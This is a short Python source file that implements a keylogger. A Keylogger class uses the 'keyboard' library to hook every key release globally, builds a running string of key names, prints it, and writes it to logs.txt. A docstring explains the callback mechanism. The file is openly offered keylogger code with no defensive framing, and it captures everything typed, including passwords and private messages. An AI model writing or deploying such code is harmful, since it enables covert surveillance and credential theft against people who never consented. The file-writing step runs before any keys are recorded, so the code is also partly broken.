import keyboard


class Keylogger:
    def __init__(self):
        self.log = ""
   

    def callback(self, event):
        '''
            there is a global listener that gets activated when we call on a function such as
            on_press which then  activates the listener. At this point we have a callback 
            and I am custom making that callback function so that the listener knows where
            to point to. The event callback has three attributes which are: name, scan_code
            (the ascii dec number for the char), time (timestamp)
        '''
        name = event.name
        self.log += name
        print(self.log)
    
    
    def logging(self):
        print(f"Log in the Logging(): {self.log}")
        with open('logs.txt', 'w') as f:
            f.write(self.log)


    def run(self):
        keyboard.on_release(callback=self.callback)
        #print(self.log)
        self.logging()
        keyboard.wait() #causes a wait until we do ctl-c


if __name__ == "__main__":
    kl = Keylogger()
    kl.run()
